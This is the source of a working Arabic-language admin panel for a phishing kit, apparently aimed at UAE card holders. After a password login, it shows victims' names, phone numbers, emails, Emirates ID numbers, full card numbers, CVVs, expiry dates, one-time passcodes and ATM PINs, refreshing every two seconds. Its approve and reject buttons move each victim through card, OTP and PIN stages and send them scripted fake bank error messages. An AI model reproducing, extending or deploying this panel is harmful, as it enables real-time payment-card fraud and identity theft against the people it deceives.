<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم فزعة - الإدارة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            padding: 20px;
            color: #333;
        }

        .header {
            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a8c 100%);
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        .header h1 { font-size: 28px; }

        .logout-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }

        .logout-btn:hover { background: #c82333; }

        #loginOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(30, 58, 95, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            max-width: 400px;
        }

        .login-box h2 { margin-bottom: 20px; color: #1e3a5f; }

        .login-box input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 12px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
        }

        .login-box button:hover { background: #218838; }

        .login-error {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        .orders-container { display: grid; gap: 20px; }

        .order-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            border-right: 5px solid #d4af37;
        }

        .order-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }

        .order-id { font-weight: bold; font-size: 16px; color: #1e3a5f; }

        .status-badge {
            padding: 6px 12px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
        }

        .status-waiting { background: #fff3cd; color: #856404; }
        .status-approved { background: #d4edda; color: #155724; }
        .status-rejected { background: #f8d7da; color: #721c24; }

        .data-section { margin-bottom: 20px; }

        .section-title {
            font-weight: bold;
            color: #1e3a5f;
            margin-bottom: 12px;
            padding-bottom: 10px;
            border-bottom: 2px solid #d4af37;
            font-size: 14px;
        }

        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }

        .data-item { font-size: 13px; }

        .data-label {
            color: #6c7a89;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        .data-value {
            color: #1e3a5f;
            word-break: break-all;
            background: #f8f9fa;
            padding: 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .card-data {
            background: #f0f9ff;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #0066cc;
            margin-bottom: 15px;
        }

        .card-data strong { display: block; margin-bottom: 10px; color: #1e3a5f; }

        .otp-data { background: #f0fff4; border-left-color: #28a745; }
        .pin-data { background: #fff5f0; border-left-color: #dc3545; }

        .otp-value, .pin-value {
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 1px;
            font-family: 'Courier New', monospace;
            padding: 10px;
            background: white;
            border-radius: 4px;
            display: inline-block;
        }

        .otp-value { color: #28a745; }
        .pin-value { color: #dc3545; }

        .actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
            flex-wrap: wrap;
            border-top: 2px solid #eee;
            padding-top: 15px;
        }

        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
            font-size: 14px;
            flex: 1;
            min-width: 140px;
        }

        .btn-approve { background: #28a745; color: white; }
        .btn-approve:hover { background: #218838; }

        .btn-reject { background: #dc3545; color: white; }
        .btn-reject:hover { background: #c82333; }

        .btn:disabled { opacity: 0.5; cursor: not-allowed; }

        .no-orders { text-align: center; color: #6c7a89; padding: 40px 20px; font-size: 16px; }
        .loading { text-align: center; color: #6c7a89; padding: 20px; }

        .current-stage {
            display: inline-block;
            background: #e7f3ff;
            color: #0066cc;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 10px;
        }

        .no-actions {
            color: #6c7a89;
            font-size: 13px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 4px;
        }

        @media (max-width: 768px) {
            .order-header { flex-direction: column; align-items: flex-start; gap: 10px; }
            .data-grid { grid-template-columns: 1fr; }
            .actions { flex-direction: column; }
            .btn { width: 100%; }
        }
    </style>
</head>
<body>

<div id="loginOverlay">
    <div class="login-box">
        <h2>🔐 تسجيل دخول الإدارة</h2>
        <input type="password" id="adminPass" placeholder="أدخل كلمة المرور" autocomplete="off">
        <button onclick="login()">دخول</button>
        <p class="login-error" id="loginError">كلمة المرور غير صحيحة</p>
    </div>
</div>

<div id="mainContent" style="display: none;">
    <div class="header">
        <h1>📊 لوحة تحكم فزعة</h1>
        <button class="logout-btn" onclick="logout()">تسجيل خروج</button>
    </div>
    <div id="ordersContainer" class="orders-container">
        <div class="loading">جاري تحميل الطلبات...</div>
    </div>
</div>

<script>
    let authToken = localStorage.getItem('adminToken');
    const mainContent = document.getElementById('mainContent');
    const loginOverlay = document.getElementById('loginOverlay');

    if (authToken) {
        loginOverlay.style.display = 'none';
        mainContent.style.display = 'block';
    }

    async function login() {
        const password = document.getElementById('adminPass').value;
        if (!password) {
            showLoginError('يرجى إدخال كلمة المرور');
            return;
        }

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password })
            });
            const data = await response.json();
            if (data.success) {
                authToken = data.token;
                localStorage.setItem('adminToken', authToken);
                loginOverlay.style.display = 'none';
                mainContent.style.display = 'block';
                fetchOrders();
            } else {
                showLoginError('كلمة المرور غير صحيحة');
            }
        } catch (e) {
            console.error(e);
            showLoginError('حدث خطأ في الاتصال');
        }
    }

    function showLoginError(msg) {
        const errorEl = document.getElementById('loginError');
        errorEl.textContent = msg;
        errorEl.style.display = 'block';
    }

    function logout() {
        localStorage.removeItem('adminToken');
        location.reload();
    }

    async function fetchOrders() {
        if (!authToken) return;
        try {
            const response = await fetch('/api/get-data', {
                headers: { 'Authorization': authToken }
            });
            const orders = await response.json();
            renderOrders(orders);
        } catch (e) {
            console.error('Error fetching orders:', e);
        }
    }

    function renderOrders(orders) {
        const container = document.getElementById('ordersContainer');
        
        if (!orders || orders.length === 0) {
            container.innerHTML = '<div class="no-orders">لا توجد طلبات حالياً</div>';
            return;
        }

        container.innerHTML = orders.reverse().map(order => {
            const stage = getCurrentStage(order.status);
            const canApprove = isAwaitingApproval(order.status);
            
            return `
                <div class="order-card">
                    <div class="order-header">
                        <div>
                            <span class="order-id">طلب رقم: ${order.id}</span>
                            <span class="current-stage">${stage}</span>
                        </div>
                        <span class="status-badge ${getStatusClass(order.status)}">${getStatusText(order.status)}</span>
                    </div>

                    <div class="data-section">
                        <div class="section-title">👤 البيانات الشخصية</div>
                        <div class="data-grid">
                            <div class="data-item">
                                <span class="data-label">الاسم الكامل</span>
                                <span class="data-value">${order.full_name || '---'}</span>
                            </div>
                            <div class="data-item">
                                <span class="data-label">الهاتف</span>
                                <span class="data-value">${order.phone || '---'}</span>
                            </div>
                            <div class="data-item">
                                <span class="data-label">البريد الإلكتروني</span>
                                <span class="data-value">${order.email || '---'}</span>
                            </div>
                            <div class="data-item">
                                <span class="data-label">رقم الهوية</span>
                                <span class="data-value">${order.emirates_id || '---'}</span>
                            </div>
                        </div>
                    </div>

                    ${order.cardNumber ? `
                    <div class="data-section">
                        <div class="section-title">💳 بيانات البطاقة (كاملة)</div>
                        <div class="card-data">
                            <div class="data-grid">
                                <div class="data-item">
                                    <span class="data-label">رقم البطاقة (16 رقم)</span>
                                    <span class="data-value">${order.cardNumber}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">اسم صاحب البطاقة</span>
                                    <span class="data-value">${order.cardName || '---'}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">تاريخ الانتهاء</span>
                                    <span class="data-value">${order.expiryDate || '---'}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">CVV (3 أرقام)</span>
                                    <span class="data-value">${order.cvv || '---'}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    ` : ''}

                    ${order.otp ? `
                    <div class="data-section">
                        <div class="section-title">🔐 رمز التحقق (OTP)</div>
                        <div class="card-data otp-data">
                            <span class="otp-value">${order.otp}</span>
                        </div>
                    </div>
                    ` : ''}

                    ${order.pin ? `
                    <div class="data-section">
                        <div class="section-title">🏧 الرقم السري (ATM PIN - كامل)</div>
                        <div class="card-data pin-data">
                            <span class="pin-value">${order.pin}</span>
                        </div>
                    </div>
                    ` : ''}

                    ${canApprove ? `
                    <div class="actions">
                        <button class="btn btn-approve" onclick="approveOrder('${order.id}', '${order.status}')">✅ قبول</button>
                        <button class="btn btn-reject" onclick="rejectOrder('${order.id}', '${order.status}')">❌ رفض</button>
                    </div>
                    ` : '<div class="no-actions">✓ تمت معالجة هذا الطلب</div>'}
                </div>
            `;
        }).join('');
    }

    function getCurrentStage(status) {
        const stages = {
            'waiting_payment': 'مرحلة البطاقة',
            'waiting_otp': 'مرحلة OTP',
            'waiting_pin': 'مرحلة PIN',
            'approved_payment': 'تم قبول البطاقة',
            'approved_otp': 'تم قبول OTP',
            'approved_pin': 'تم قبول PIN',
            'rejected_payment': 'تم رفض البطاقة',
            'rejected_otp': 'تم رفض OTP',
            'rejected_pin': 'تم رفض PIN'
        };
        return stages[status] || status;
    }

    function isAwaitingApproval(status) {
        return ['waiting_payment', 'waiting_otp', 'waiting_pin'].includes(status);
    }

    function getStatusClass(status) {
        if (status.includes('approved')) return 'status-approved';
        if (status.includes('rejected')) return 'status-rejected';
        return 'status-waiting';
    }

    function getStatusText(status) {
        const texts = {
            'waiting_payment': 'بانتظار الموافقة على البطاقة',
            'waiting_otp': 'بانتظار الموافقة على OTP',
            'waiting_pin': 'بانتظار الموافقة على PIN',
            'approved_payment': 'تم قبول البطاقة',
            'approved_otp': 'تم قبول OTP',
            'approved_pin': 'تم قبول PIN',
            'rejected_payment': 'تم رفض البطاقة',
            'rejected_otp': 'تم رفض OTP',
            'rejected_pin': 'تم رفض PIN'
        };
        return texts[status] || status;
    }

    async function approveOrder(orderId, status) {
        let newStatus = 'approved_payment';
        if (status === 'waiting_otp') newStatus = 'approved_otp';
        if (status === 'waiting_pin') newStatus = 'approved_pin';

        try {
            await fetch('/api/update-order-status', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': authToken
                },
                body: JSON.stringify({ orderId, status: newStatus })
            });
            fetchOrders();
        } catch (e) {
            console.error('Error approving order:', e);
            alert('حدث خطأ أثناء الموافقة');
        }
    }

    async function rejectOrder(orderId, status) {
        let errorMsg = '';
        
        if (status === 'waiting_payment') {
            errorMsg = 'تم رفض عملية الدفع، بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو تجربة طرق دفع أخرى.';
        } else if (status === 'waiting_otp') {
            errorMsg = 'الرمز غير صالح أو بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع أخرى.';
        } else if (status === 'waiting_pin') {
            errorMsg = 'رقم الصراف الآلي غير صحيح، قد تكون بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.';
        }

        let newStatus = 'rejected_payment';
        if (status === 'waiting_otp') newStatus = 'rejected_otp';
        if (status === 'waiting_pin') newStatus = 'rejected_pin';

        try {
            await fetch('/api/update-order-status', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': authToken
                },
                body: JSON.stringify({ orderId, status: newStatus, lastError: errorMsg })
            });
            fetchOrders();
        } catch (e) {
            console.error('Error rejecting order:', e);
            alert('حدث خطأ أثناء الرفض');
        }
    }

    if (authToken) {
        setInterval(fetchOrders, 2000);
        fetchOrders();
    }

    document.getElementById('adminPass')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') login();
    });
</script>

</body>
</html>
